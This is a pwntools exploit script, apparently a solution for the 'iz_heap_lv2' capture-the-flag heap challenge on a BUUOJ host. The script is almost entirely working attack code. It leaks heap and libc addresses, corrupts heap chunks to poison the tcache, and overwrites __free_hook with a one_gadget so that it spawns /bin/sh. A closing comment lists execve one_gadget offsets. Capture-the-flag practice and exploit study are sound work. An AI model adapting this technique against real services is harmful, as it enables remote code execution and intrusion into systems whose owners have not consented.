#!/usr/bin/python3

from pwn import *

exe = ELF("iz_heap_lv2_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""


                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("node4.buuoj.cn", 25298)
else:
    p = process(exe.path)

GDB()


def add(size, data):
    sla(b"Choice: \n", "1")
    sla(b":", str(size).encode())
    sa(b":", data)


def delete(idx):
    sla(b"Choice: \n", "3")
    sla(b":", str(idx).encode())


def edit(idx, data):
    sla(b"Choice: \n", "2")
    sla(b":", str(idx).encode())
    sa(b":", data)


def show(idx):
    sla(b"Choice: \n", "4")
    sla(b":", str(idx).encode())
    p.recvuntil(b"Data: ")
    return u64(p.recvline(keepends=False).ljust(8, b"\0"))


add(0, b"")
add(0, b"")

delete(0)
delete(1)
add(0, b"")

heap = show(0) - 0x260
info("Heap: " + hex(heap))
delete(0)

for i in range(7):
    add(0xF0, b"wan")


presize = 0x5F0
add(0xF0, flat(0, presize + 1, heap + 0x9A0, heap + 0x9A0))
add(0xF0, b"wan")
add(0xF0, b"wan")
add(0xF0, b"wan")
add(0xF0, b"wan")
add(0xF0, b"wan")
add(0xF0, flat(0))  # 13
add(0x30, b"wan")
delete(12)
add(0xF8, b"".ljust(0xF0) + p64(presize))  # 12
for i in range(7):
    delete(i)

delete(13)
for i in range(7):
    add(0xF0, b"wan")
delete(9)
delete(10)
delete(8)

add(0x0, b"wan")  # 8
add(0x0, b"wan")  # 9
add(0x0, b"wan")  #
libc.address = show(10) - 0x3EC140
info("Libc base: " + hex(libc.address))
add(0xA0, b"wan")
add(0xD0, b"a" * 0x10 + flat(0, 0x101, libc.sym.__free_hook))
add(0xF0, b"wan")
add(0xF0, p64(libc.address + 0x4F322))
delete(0)

p.interactive()


"""
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
